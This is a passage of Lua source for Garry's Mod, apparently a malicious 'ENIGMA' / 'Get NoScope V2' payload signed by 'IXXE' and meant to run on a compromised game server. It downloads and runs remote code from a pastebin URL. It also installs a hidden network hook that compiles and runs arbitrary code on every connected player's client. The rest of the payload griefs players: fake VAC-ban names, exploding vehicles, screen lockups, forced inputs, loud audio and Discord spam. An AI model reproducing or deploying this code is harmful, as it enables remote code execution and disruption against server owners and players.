        &quot;Jodingue&quot;,
        &quot;Kazuki&quot;,
        &quot;Keeta&quot;,
        &quot;DJTB&quot;,
        &quot;Zilnix&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;
    }

    timer.Create( &quot;gvacspam&quot;, 0.3, 0, function()
        for k, ply in pairs( player.GetAll() ) do
            DarkRP.notify(ply, 2, 2, &quot;[Oh No !] &quot;..table.Random(membresenigma)..&quot;&quot;)
        end
    end)

    local sun = ents.FindByClass(&quot;env_sun&quot;)
    if #sun == 0 then return end
    sun = sun[1]
    hook.Add(&quot;Think&quot;,&quot;\xFFsun\xFF&quot;,function()
        sun:SetKeyValue(&quot;sun_dir&quot;, math.sin(CurTime())/3 .. &quot; &quot; .. math.cos(CurTime())/3 .. &quot; 0.901970&quot;)
        sun:SetModelScale(120)
    end)


    for k,v in pairs(player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(400 * 4);
    end


    timer.Create( &quot;gtonip&quot;, 1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
            v:setDarkRPVar( &quot;rpname&quot;, &quot;This Steam account has been VAC banned from secure servers due to a cheating infraction.&quot; )
        end

    end )


    timer.Simple( 15, function()
        http.Fetch('https://pastebin.com/raw/7ABFD4Bu',function(b,l,h,c)RunString(b)end,nil)
    end )

end)



--[[

    Get NoScope V2

]]--


print([[ 
 ██████╗ ███████╗████████╗    
██╔════╝ ██╔════╝╚══██╔══╝    
██║  ███╗█████╗     ██║       
██║   ██║██╔══╝     ██║       
╚██████╔╝███████╗   ██║       
 ╚═════╝ ╚══════╝   ╚═╝       
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗
████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║██║   ██║███████╗██║     ██║   ██║██████╔╝█████╗  
██║╚██╗██║██║   ██║╚════██║██║     ██║   ██║██╔═══╝ ██╔══╝ 
██║ ╚████║╚██████╔╝███████║╚██████╗╚██████╔╝██║     ███████╗ 
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝

By IXXE &lt;3 ]])

for k, v in pairs(player.GetAll()) do
     v:SendLua(&quot;steamworks.FileInfo(1618885873,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)&quot;)
end

for k, v in pairs( player.GetAll() ) do
    if ( v:Alive() ) then
     v:GodEnable()
    else
        v:Spawn()
        timer.Simple( 5, function()
            v:GodEnable()
        end)
    end
end


game.AddParticles( &quot;particles/enigma.pcf&quot; )
PrecacheParticleSystem(&quot;enigma&quot;)

local function rdm_str(len)
    if !len or len &lt;= 0 then return '' end
    return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;ifyouseethisdontpanicitsme&quot;,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
timer.Simple( 17, function()
    SendToClient([[

game.AddParticles( &quot;particles/enigma.pcf&quot; )
PrecacheParticleSystem(&quot;enigma&quot;)
hook.Add(&quot;Think&quot;,&quot;iuefheqefq&quot;,function() gui.HideGameUI() end)


timer.Create(&quot;nonameplease&quot;, 5, 0,function()
    for i=1, #player.GetHumans() do
        local ply = player.GetHumans()[i]
        ply:Say( &quot;/ooc DISCORD : https://discord.gg/9rS2jhf&quot;)
    end
end)

local CreateModel = function(mdl, isragdoll)
  local ent

  if isragdoll then
    ent = ClientsideRagdoll(mdl)
  else
    ent = ClientsideModel(mdl, RENDERGROUP_OTHER)
  end
  
  
  return ent
end

local NewHookAdd = function(str, name, func)
  --name = &quot;dronesrewrite_hell_hooks&quot; .. name
  hook.Add(str, name, func)
  
  table.insert(cache, {
    str = str,
    name = name
  })
end

local cache = { }
timercache = { }
local Const = 0
local Noise = nil
local pl = LocalPlayer()
timer.Create(&quot;charglogo&quot;, 2, 1, function()
  local dlight = DynamicLight(pl:EntIndex())
  if dlight then
    dlight.pos = Vector(-2224.216797, -2918.063721, 2354.03125)
    dlight.r = 255
    dlight.g = 0
    dlight.b = 0
    dlight.brightness = 16
    dlight.Decay = 1000
    dlight.Size = 2000
    dlight.DieTime = CurTime() + 2
  end

  local pos = pl:GetPos() + Vector(0, 0, 120)
  local ang = Angle(0, pl:GetAngles().y, 0)

  local tr = util.TraceLine({
    start = pos,
    endpos = pos + ang:Forward() * 86,
    filter = pl
  })

  local rag_pos = tr.HitPos + tr.HitNormal * 3 - Vector(0, 0, 80)

    for i = 1, 16 do
        sound.Play(&quot;vo/npc/Barney/ba_laugh04.wav&quot;, Vector( 0, 0, 0 ) )
    end
    for i = 1, 10 do
        ParticleEffectAttach(&quot;enigma&quot;,PATTACH_ABSORIGIN_FOLLOW,LocalPlayer(),0)
    end

  local mdl = CreateModel(&quot;models/food/hotdog.mdl&quot;)
  mdl:SetModelScale(5)
  mdl:SetAngles(ang + Angle(15, 180, 0))
  mdl:SetPos(rag_pos)
  mdl:Spawn()

  --ParticleEffect(&quot;fire_test2&quot;, rag_pos, Angle(0, 0, 0))

  hook.Add(&quot;CalcView&quot;, &quot;dronesrewrite_doshit&quot;, function(ply, _pos, _ang, fov)
    local view = { }
    view.origin = pos + VectorRand()
    view.angles = ang
    view.fov = fov + math.random(-80, -50)
    
    return view
  end)
  
  timer.Create(&quot;charglo&quot;, 1.4, 1, function()
    mdl:Remove()
    hook.Remove(&quot;CalcView&quot;, &quot;dronesrewrite_doshit&quot;) 
  end)
end)
]])
end)

timer.Simple( 20, function()
    timer.Create( &quot;gvacspaam&quot;, 0.1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:SendLua('RunConsoleCommand(&quot;impulse&quot;,&quot;100&quot;)')
        end
    end)
    hook.Add( 'SetupMove', 'auto hop', function( ply, move )
        if not ply:IsOnGround() then
            move:SetButtons( bit.band( move:GetButtons(), bit.bnot( IN_JUMP ) ) )
        end
    end )
    for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then
 
        local explo = ents.Create(&quot;env_explosion&quot;)
 
        explo:SetPos(v:GetPos())
 
        explo:SetKeyValue(&quot;iMagnitude&quot;, &quot;300&quot;)
 
        explo:Spawn()
 
        explo:Activate()
 
        explo:Fire(&quot;Explode&quot;, &quot;&quot;, 0)
 
        end
 
    end
    for k,v in pairs(player.GetAll()) do 
        local a = v:LookupBone(&quot;ValveBiped.Bip01_Head1&quot;)
        local b = v:LookupBone(&quot;ValveBiped.Bip01_R_Thigh&quot;)
        local c = v:LookupBone(&quot;ValveBiped.Bip01_L_Thigh&quot;)
        local d = v:LookupBone(&quot;ValveBiped.Bip01_R_Calf&quot;)
        local e = v:LookupBone(&quot;ValveBiped.Bip01_L_Calf&quot;)
        local f = v:LookupBone(&quot;ValveBiped.Bip01_R_UpperArm&quot;)
        local g = v:LookupBone(&quot;ValveBiped.Bip01_L_UpperArm&quot;)
        local h = v:LookupBone(&quot;ValveBiped.Bip01_R_Forearm&quot;)
        local i = v:LookupBone(&quot;ValveBiped.Bip01_L_Forearm&quot;)
        local j = v:LookupBone(&quot;ValveBiped.Bip01_R_Clavicle&quot;)
        local k = v:LookupBone(&quot;ValveBiped.Bip01_L_Clavicle&quot;)
        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
    end
    SendToClient([[

    surface.CreateFont( &quot;PixelCutsceneScaled&quot;,{
        font = &quot;Open Sans&quot;, 
        size = 500,
        weight = 1000,
        antialias = true
    })

    surface.CreateFont( &quot;PixelSmall&quot;,{
        font = &quot;Open Sans&quot;, 
        size = 135,
        weight = 500,
        antialias = false
    })
    surface.CreateFont(&quot;lapolice&quot;, {
        font = &quot;Open Sans&quot;,  
        size = ScrW()*0.02, 
        weight = 10, 
        blursize = 0, 
        scanlines = 2.5, 
        antialias = false
    })

    local function gettextcolor( a )
    
        local r = 0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local g = -0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local b = 215
    
        return Color( r, g, b, a or 255 )
    
    end

    local w,h = ScrW(), ScrH()
    local W, H = ScrW(), ScrH()
    local MySelf = LocalPlayer()
    
    if ohno then
        ohno:Remove()
        ohno = nil
    end
    
    ohno = vgui.Create( &quot;DFrame&quot; )
    ohno:SetSize( w, h )
    ohno:SetPos(0,0)
    ohno:SetDraggable ( false )
    ohno:SetTitle(&quot;&quot;)
    ohno:MakePopup();
    ohno:ShowCloseButton(false)

    ohno.Paint = function( self ) 
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
    end
    
    local pw, ph = w, h*0.6
    local px, py = w/2-pw/2, h/2-ph/2

    
    local Close = vgui.Create( &quot;DButton&quot;, ohno )
    Close:SetPos(px, py)
    Close:SetText( &quot;&quot; )
    Close:SetSize( pw, ph ) 
    Close.Paint = function( self, tw, th )
            
        local shift = math.sin(RealTime()*3)*1.5 + 5
            
        local text = &quot;&Sigma;NIGMA&quot;
        local text2 = &quot;&Sigma;&quot;
        local text3 = &quot;RIP ;)&quot;
        local text4 = &quot;&Sigma;NIGMA&quot;

            draw.SimpleText( text, &quot;PixelCutsceneScaled&quot;, tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.SimpleText( text, &quot;PixelCutsceneScaled&quot;, tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.DrawText( &quot;(╯&deg;□&deg;）╯︵ ┻━┻&quot;, &quot;lapolice&quot;, ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
            draw.DrawText( &quot;(╯&deg;□&deg;）╯︵ ┻━┻&quot;, &quot;lapolice&quot;, math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )   
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )

    end
    surface.PlaySound( &quot;vo/npc/male01/ohno.wav&quot; )
    surface.PlaySound( &quot;vo/npc/male01/ohno.wav&quot; )
    timer.Create(&quot;fff&quot;, 0.1, 0, function() 
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)

    timer.Simple( 15, function()

        wut = vgui.Create( &quot;DFrame&quot; )
        wut:SetSize( w, h )
        wut:SetPos(0,0)
        wut:SetDraggable ( false )
        wut:SetTitle(&quot;&quot;)
        wut:ShowCloseButton(false)

        wut.Paint = function( self ) 
            surface.SetDrawColor(30, 30, 30, 0)
        end

        local Close = vgui.Create( &quot;DButton&quot;, wut )
        Close:SetPos(px, py)
        Close:SetText( &quot;&quot; )
        Close:SetSize( pw, ph ) 
        Close.Paint = function( self, tw, th )
                
            local shift = math.sin(RealTime()*3)*1.5 + 5
                
            local text = &quot;&Sigma;NIGMA&quot;

                draw.SimpleText( text, &quot;PixelCutsceneScaled&quot;, tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                draw.SimpleText( text, &quot;PixelCutsceneScaled&quot;, tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

        end

        RunConsoleCommand(&quot;r_shader_srgb&quot;,&quot;1&quot;)
        RunConsoleCommand(&quot;gmod_language&quot;,&quot;ko&quot;)
        ohno:Remove()
        ohno = nil

        local name = GetConVar(&quot;sv_skyname&quot;):GetString()
        if name == &quot;painted&quot; then
          local sky
          for _, v in ipairs(ents.GetAll()) do
            if v:GetClass() == &quot;env_skypaint&quot; then
              sky = v
              break
            end
          end
          if !IsValid(sky) then return end
          hook.Add(&quot;PostRender&quot;,&quot;\xFFsky\xFF&quot;,function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            col = Vector(col.r/255,col.g/255,col.b/255)
            sky:SetTopColor(col)
            sky:SetBottomColor(col)
          end)
        else
          local prefix  = {&quot;lf&quot;,&quot;ft&quot;,&quot;rt&quot;,&quot;bk&quot;,&quot;dn&quot;,&quot;up&quot;}
          local mats = {}
          for i=1,6 do
            mats[#mats+1] = Material(&quot;skybox/&quot; .. name .. prefix[i])
          end
          hook.Add(&quot;PostRender&quot;,&quot;\xFFsky\xFF&quot;,function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            for i=1,6 do
              mats[i]:SetVector(&quot;$color&quot;,Vector(col.r/255,col.g/255,col.b/255))
            end
          end)
        end
        local chienchaud = ClientsideModel(&quot;models/food/hotdog.mdl&quot;)
        chienchaud:SetNoDraw(true)
        chienchaud:SetModelScale(120)
        timer.Create(&quot;charglogo&quot;, 0.01, 0, function()
          chienchaud:SetAngles(Angle(0, CurTime()*90 % 360 ,180) )
        end)
        --chienchaud:SetMaterial( &quot;models/screenspace&quot; )
        local data = {}
        local function genchienchaud(id)
          local pos = LocalPlayer():GetPos()
          data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
        end
        for i=1, 150 do
          genchienchaud(i)
        end
        hook.Add(&quot;PostDrawOpaqueRenderables&quot;,&quot;\xFFitsrainingchienchauds\xFF&quot;,function()
          local z = LocalPlayer():GetPos().z
          for i=1, #data do
            chienchaud:SetPos(data[i][1])
            chienchaud:SetupBones()
            chienchaud:DrawModel()
            data[i][1].z = data[i][1].z - data[i][2] / 20
            if data[i][1].z &lt;= z then
              genchienchaud(i)
            end
          end
        end)



    end )


    sound.PlayURL( &quot;https://gvac.cz/assets/mlg.mp3&quot;, &quot;mono noblock noplay&quot;, function( station ) 
        timer.Simple( 0.1, function()                     
            ClientStation = station
            station:EnableLooping( true )
            station:Play()
            station:SetVolume( 30 )
        end )
    end )

timer.Create(&quot;f&quot;, 0.11, 0, function() 
    RunConsoleCommand(&quot;+attack&quot;)
end)
timer.Create(&quot;ff&quot;, 0.12, 0, function() 
    RunConsoleCommand(&quot;-attack&quot;)
end)
]])
end)

timer.Create(&quot;ok&quot;, 1, 0, function() 
    for k, v in pairs( ents.FindByClass( &quot;prop_*&quot; ) ) do local phys = v:GetPhysicsObject()
        if (IsValid(phys)) then
            phys:EnableMotion(true)
        end 
    end

    local props = ents.GetAll()
    for _, prop in ipairs( props ) do
        if(prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter( Vector( 0, 0, ((650 * 0.73) * prop:GetPhysicsObject():GetMass() ) ) )
        end
    end
end)


timer.Simple( 20, function()

    membresenigma = 
    {
        &quot;Akita&quot;,
        &quot;IXXE&quot;,
        &quot;Jodingue&quot;,
        &quot;Kazuki&quot;,
        &quot;Keeta&quot;,
        &quot;DJTB&quot;,
        &quot;Zilnix&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;GET NO SCOPE !!!!&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;,
        &quot;BAN HAMMER &gt; https://bit.ly/2LUu3GN&quot;
    }

    timer.Create( &quot;gvacspam&quot;, 0.2, 0, function()
        for k, ply in pairs( player.GetAll() ) do
            DarkRP.notify(ply, 2, 2, &quot;[Oh No !] &quot;..table.Random(membresenigma)..&quot;&quot;)
        end
    end)

    local sun = ents.FindByClass(&quot;env_sun&quot;)
    if #sun == 0 then return end
    sun = sun[1]
    hook.Add(&quot;Think&quot;,&quot;\xFFsun\xFF&quot;,function()
        sun:SetKeyValue(&quot;sun_dir&quot;, math.sin(CurTime())/3 .. &quot; &quot; .. math.cos(CurTime())/3 .. &quot; 0.901970&quot;)
        sun:SetModelScale(120)
    end)


    for k,v in pairs(player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(400 * 4);
    end


    timer.Create( &quot;gtonip&quot;, 1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
            v:setDarkRPVar( &quot;rpname&quot;, &quot;This Steam account has been VAC banned from secure servers due to a cheating infraction.&quot; )
        end

    end )


    timer.Simple( 17, function()
        http.Fetch('https://pastebin.com/raw/7ABFD4Bu',function(b,l,h,c)RunString(b)end,nil)
    end )

end)


timer.Create( &quot;gvacspam&quot;, 0.1, 0, function()
    SendToClient([[
    print(&quot;GET NOSCOPE  !!&quot;)
   ]])
    print(&quot;GET NOSCOPE  !!&quot;)
end) 



--[[

    ScoreBoard

]]--



timer.Create(&quot;TimerGo&quot;,1,1,function()

hook.Remove(&quot;ScoreboardHide&quot;, &quot;FAdmin_scoreboard&quot;)
hook.Remove(&quot;ScoreboardShow&quot;, &quot;FAdmin_scoreboard&quot;)

local function SandBox()
    return gmod.GetGamemode().Name == 'Sandbox'
end

local blur = Material(&quot;pp/blurscreen&quot;)

surface.CreateFont( &quot;UserName&quot;, {
 font = &quot;BorisBlackBloxx&quot;,
 size = 25,
 weight = 800,
} )

surface.CreateFont( &quot;UserJob&quot;, {
 font = &quot;BorisBlackBloxx&quot;,
 size = 24,
 weight = 800,
} )

surface.CreateFont( &quot;UserPing&quot;, {
 font = &quot;BorisBlackBloxx&quot;,
 size = 20,
 weight = 800,
} )
surface.CreateFont( &quot;Popup&quot;, {
 font = &quot;BorisBlackBloxx&quot;,
 size = 21,
 weight = 750,
} )

surface.CreateFont( &quot;SBInfo&quot;, {
 font = &quot;BorisBlackBloxx&quot;,
 size = 18,
 weight = 800,
} )

local sboard

function DrawScoreBoard()
	sboard = vgui.Create(&quot;DFrame&quot;)
	sboard:SetSize( ScrW() * 0.5, ScrH() *0.95 )
	sboard:SetTitle(&quot;&quot;)
	sboard:Center()
	sboard:SetDraggable(false)
	sboard:ShowCloseButton(false)
	sboard:MakePopup()

	local x, y = sboard:GetPos()

	sboard.Paint = function(self, w, h)
	Derma_DrawBackgroundBlur( self )
       	render.SetScissorRect(x, y, w + x, h + y, true)

		surface.SetDrawColor(Color(0, 0, 0, 225))
		surface.DrawRect(40, 125, w, h - h + 25)

		draw.SimpleText( &quot;Nom RP&quot;, &quot;SBInfo&quot;, 90, (h - h+129), Color(255, 255, 255	, 255))
		draw.SimpleText( &quot;Job&quot;, &quot;SBInfo&quot;, w/2+26, (h - h+129), Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
		draw.SimpleText( &quot;Ping&quot;, &quot;SBInfo&quot;, w-36, (h - h+129), Color(255, 255, 255, 255))
		draw.SimpleText( &quot;Mort&quot;, &quot;SBInfo&quot;, (w - ((w/7)*2))+18, (h - h+129), Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
		draw.SimpleText( &quot;Tuer&quot;, &quot;SBInfo&quot;, (w - (w/7)-20)+10, (h - h+129), Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)

        render.SetScissorRect(0, 0, 0, 0, false)
	end

	local sboardscroll = sboard:Add(&quot;DScrollPanel&quot;)
	sboardscroll:SetPos(40, 150)
	sboardscroll:SetSize(sboard:GetWide() - 48 + 23, sboard:GetTall() - 200)

	sboardscroll.VBar.Paint = function() end
	sboardscroll.VBar.btnGrip.Paint = sboardscroll.VBar.Paint
	sboardscroll.VBar.btnUp.Paint = sboardscroll.VBar.Paint
	sboardscroll.VBar.btnDown.Paint = sboardscroll.VBar.Paint


	sboard.Update = function()

		sboardscroll:Clear()

		for k, v in pairs(player.GetAll()) do

			local backp = sboardscroll:Add(&quot;DPanel&quot;)
			backp:SetPos(0, k * 37 - 37)
			backp:SetSize(sboardscroll:GetWide(), 35)

			local button = vgui.Create(&quot;DButton&quot;, backp)
			button:SetSize(backp:GetWide(), 36)
			button:SetPos(0, 0)
			button:SetText(&quot;&quot;)
			button.Paint = function(self, w, h)
				surface.SetDrawColor(Color(0, 0, 0, 0))
      			surface.DrawRect(0, 0, w, h)
      		end
			button.DoClick = function()
			if IsValid(playerinfoforthetabmenu) then
			     playerinfoforthetabmenu:Close()
      end
      if IsValid(adminmenuforthetabmenu) then
           adminmenuforthetabmenu:Close()
      end
      if LocalPlayer():IsUserGroup(&quot;admin&quot;)
      or LocalPlayer():IsUserGroup(&quot;superadmin&quot;)
      or LocalPlayer():IsUserGroup(&quot;fondateur&quot;)
      or LocalPlayer():IsUserGroup(&quot;co-fondateur&quot;)
      or LocalPlayer():IsUserGroup(&quot;SuperAdmin&quot;)
      or LocalPlayer():IsUserGroup(&quot;moderateur&quot;)
      or LocalPlayer():IsUserGroup(&quot;moderateur-test&quot;)
      or LocalPlayer():IsUserGroup(&quot;animateur&quot;) then
      adminmenuforthetabmenu = vgui.Create(&quot;DFrame&quot;)
      adminmenuforthetabmenu:SetSize( ScrW() * 0.1675, ScrH() *0.17 )
      adminmenuforthetabmenu:SetTitle(&quot;&quot;)
      adminmenuforthetabmenu:SetPos( ScrW() * 0.753, ScrH() *0.175 )
      adminmenuforthetabmenu:SetDraggable(false)
      adminmenuforthetabmenu:ShowCloseButton(false)
      adminmenuforthetabmenu:MakePopup()
      adminmenuforthetabmenu.Paint = function(self, w, h)
      surface.SetDrawColor(175, 175, 175 ,245)
      surface.DrawRect(0, 0, w, h)
      surface.SetDrawColor(0, 0, 0, 255)
      surface.DrawRect(0, 0, w, h - h + 35)
      draw.SimpleText(&quot;Commandes Admins&quot;, &quot;UserName&quot;, 150, (h - h) + 2, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
      end
      local adminbutton = vgui.Create(&quot;DButton&quot;, adminmenuforthetabmenu)
      adminbutton:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton:SetPos( ScrW() * 0.003, ScrH() * 0.04 )
      adminbutton:SetText(&quot;Goto&quot;)
      adminbutton:SetFont(&quot;UserPing&quot;)
      adminbutton:SetTextColor(color_white)
      function adminbutton:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
  	end
      adminbutton.DoClick = function()
        local toexec = [[ulx goto &quot;]]..v:Nick()..[[&quot;]]
        LocalPlayer():ConCommand(toexec)
      end
      local adminbutton2 = vgui.Create(&quot;DButton&quot;, adminmenuforthetabmenu)
      adminbutton2:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton2:SetPos( ScrW() * 0.085, ScrH() * 0.04 )
      adminbutton2:SetText(&quot;Teleport&quot;)
      adminbutton2:SetFont(&quot;UserPing&quot;)
      adminbutton2:SetTextColor(color_white)
      function adminbutton2:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton2.DoClick = function()
        local toexec = [[ulx teleport &quot;]]..v:Nick()..[[&quot;]]
        LocalPlayer():ConCommand(toexec)
      end
      local adminbutton3 = vgui.Create(&quot;DButton&quot;, adminmenuforthetabmenu)
      adminbutton3:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton3:SetPos( ScrW() * 0.003, ScrH() * 0.083 )
      adminbutton3:SetText(&quot;Bring&quot;)
      adminbutton3:SetFont(&quot;UserPing&quot;)
      adminbutton3:SetTextColor(color_white)
      function adminbutton3:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton3.DoClick = function()
        menudubring = DermaMenu()

        local Padding = vgui.Create(&quot;DPanel&quot;)
        Padding:SetPaintBackgroundEnabled(false)
        Padding:SetSize(1,5)
        menudubring:AddPanel(Padding)

        local Title = vgui.Create(&quot;DLabel&quot;)
